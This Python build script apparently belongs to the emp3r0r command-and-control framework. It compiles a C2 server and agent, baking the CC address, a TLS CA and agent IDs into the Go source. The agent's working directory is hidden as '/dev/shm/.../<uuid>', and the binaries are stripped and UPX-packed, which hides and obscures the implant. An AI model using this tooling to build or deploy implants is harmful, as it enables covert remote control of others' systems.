#!/usr/bin/env python3

# pylint: disable=invalid-name, broad-except, too-many-arguments, too-many-instance-attributes, line-too-long

'''
this script replaces build.sh, coz bash/sed/awk is driving me insane
'''

import glob
import json
import os
import shutil
import sys
import traceback
import uuid


class GoBuild:
    '''
    all-in-one builder
    '''

    def __init__(self, target="cc",
                 cc_indicator="cc_indicator", cc_ip="[cc_ipaddr]", cc_other_names=""):
        self.target = target
        self.GOOS = os.getenv("GOOS")
        self.GOARCH = os.getenv("GOARCH")

        if self.GOOS is None:
            self.GOOS = "linux"

        if self.GOARCH is None:
            self.GOARCH = "amd64"

        # CA
        self.CA = ""

        # tags
        self.CCIP = cc_ip
        self.CC_OTHER_NAMES = cc_other_names
        self.INDICATOR = cc_indicator
        self.UUID = str(uuid.uuid1())

        # agent root directory

        if "agent_root" in CACHED_CONF:
            self.AgentRoot = CACHED_CONF['agent_root']
        else:
            self.AgentRoot = f"/dev/shm/.../{uuid.uuid4()}"
            CACHED_CONF['agent_root'] = self.AgentRoot

    def build(self):
        '''
        cd to cmd and run go build
        '''
        # write cache
        json_file = open(BUILD_JSON, "w+")
        json.dump(CACHED_CONF, json_file)
        json_file.close()

        self.gen_certs()
        # CA
        f = open("./tls/rootCA.crt")
        self.CA = f.read()
        f.close()

        self.set_tags()

        for f in glob.glob("./tls/emp3r0r-*pem"):
            print(f" Copy {f} to ./build")
            shutil.copy(f, "./build")

        try:
            os.chdir(f"./cmd/{self.target}")
        except BaseException:
            log_error(f"Cannot cd to cmd/{self.target}")

            return

        log_warn("GO BUILD starts...")
        # cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH}''' + \
        # f''' go build -ldflags='-s -w -extldflags "-static"' -o ../../build/{self.target}'''
        cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0''' + \
            f''' go build -ldflags='-s -w' -o ../../build/{self.target}'''
        os.system(cmd)
        log_warn("GO BUILD ends...")

        os.chdir("../../")
        self.unset_tags()

        if os.path.exists(f"./build/{self.target}"):
            os.system(f"upx -9 ./build/{self.target}")
        else:
            log_error("go build failed")
            sys.exit(1)

    def gen_certs(self):
        '''
        generate server cert/key, and CA if necessary
        '''

        if "ccip" in CACHED_CONF:
            if self.CCIP == CACHED_CONF['ccip'] and os.path.exists("./build/emp3r0r-key.pem"):
                return

        log_warn("[!] Generating new certs...")
        try:
            os.chdir("./tls")
            os.system(
                f"bash ./genkey-with-ip-san.sh {self.UUID} {self.UUID}.com {self.CCIP} {self.CC_OTHER_NAMES}")
            os.rename(f"./{self.UUID}-cert.pem", "./emp3r0r-cert.pem")
            os.rename(f"./{self.UUID}-key.pem", "./emp3r0r-key.pem")
            os.chdir("..")
        except BaseException as exc:
            log_error(
                f"[-] Something went wrong, see above for details: {exc}")
            sys.exit(1)

    def unset_tags(self):
        '''
        restore tags in the source

        - CA: emp3r0r CA, ./internal/tun/tls.go
        - CC indicator: check if CC is online, ./internal/agent/def.go
        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
        - CC IP: IP of CC server, ./internal/agent/def.go
        '''

        sed("./internal/agent/def.go",
            self.AgentRoot, "[agent_root]")
        sed("./internal/tun/tls.go", self.CA, "[emp3r0r_ca]")
        sed("./internal/agent/def.go", self.INDICATOR, "[cc_indicator]")
        # in case we use the same IP for indicator and CC
        sed("./internal/agent/def.go", self.CCIP, "[cc_ipaddr]")
        sed("./internal/agent/def.go", self.UUID, "[agent_uuid]")

    def set_tags(self):
        '''
        modify some tags in the source

        - CA: emp3r0r CA, ./internal/tun/tls.go
        - CC indicator: check if CC is online, ./internal/agent/def.go
        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
        - CC IP: IP of CC server, ./internal/agent/def.go
        '''

        sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
        sed("./internal/agent/def.go", "[cc_ipaddr]", self.CCIP)
        sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
        sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
        sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)


def clean():
    '''
    clean build output
    '''
    to_rm = glob.glob("./tls/emp3r0r*") + glob.glob("./tls/openssl-*") + \
        glob.glob("./build/*") + glob.glob("./tls/*.csr")

    for f in to_rm:
        try:
            # remove directories too
            if os.path.isdir(f):
                os.removedirs(f)
            else:
                os.remove(f)
            print(" Deleted "+f)
        except BaseException:
            log_error(traceback.format_exc)


def sed(path, old, new):
    '''
    works like `sed -i s/old/new/g file`
    '''
    rf = open(path)
    text = rf.read()
    to_write = text.replace(old, new)
    rf.close()

    f = open(path, "w")
    f.write(to_write)
    f.close()


def yes_no(prompt):
    '''
    y/n?
    '''
    answ = input(prompt + " [Y/n] ").lower().strip()

    if answ in ["n", "no", "nah", "nay"]:
        return False

    return True


def main(target):
    '''
    main main main
    '''
    ccip = "[cc_ipaddr]"
    indicator = "[cc_indicator]"
    use_cached = False

    if target == "clean":
        clean()

        return

    # cc IP

    if "ccip" in CACHED_CONF:
        ccip = CACHED_CONF['ccip']
        use_cached = yes_no(f"Use cached CC address ({ccip})?")

    if not use_cached:
        if yes_no("Clean everything and start over?"):
            clean()
        ccip = input("CC server address (domain name or ip address): ").strip()
        CACHED_CONF['ccip'] = ccip

    if target == "cc":
        cc_other = ""

        if not os.path.exists("./build/emp3r0r-key.pem"):
            cc_other = input(
                "Additional CC server addresses (separate with space): ").strip()
        gobuild = GoBuild(target="cc", cc_ip=ccip, cc_other_names=cc_other)
        gobuild.build()

        return

    if target != "agent":
        print("Unknown target")

        return

    # indicator

    use_cached = False

    if "cc_indicator" in CACHED_CONF:
        indicator = CACHED_CONF['cc_indicator']
        use_cached = yes_no(f"Use cached CC indicator ({indicator})?")

    if not use_cached:
        indicator = input("CC status indicator: ").strip()
        CACHED_CONF['cc_indicator'] = indicator

    gobuild = GoBuild(target="agent", cc_indicator=indicator, cc_ip=ccip)
    gobuild.build()


def log_error(msg):
    '''
    print in red
    '''
    print("\u001b[31m"+msg+"\u001b[0m")


def log_warn(msg):
    '''
    print in red
    '''
    print("\u001b[33m"+msg+"\u001b[0m")


# JSON config file, cache some user data
BUILD_JSON = "./build/build.json"
CACHED_CONF = {}
try:
    jsonf = open(BUILD_JSON)
    CACHED_CONF = json.load(jsonf)
    jsonf.close()
except BaseException:
    log_warn(traceback.format_exc())


if len(sys.argv) != 2:
    print(f"python3 {sys.argv[0]} [cc/agent]")
    sys.exit(1)
try:
    if not os.path.exists("./build"):
        os.mkdir("./build")
    main(sys.argv[1])
except (KeyboardInterrupt, EOFError, SystemExit):
    sys.exit(0)
except BaseException:
    log_error(f"[!] Exception:\n{traceback.format_exc()}")
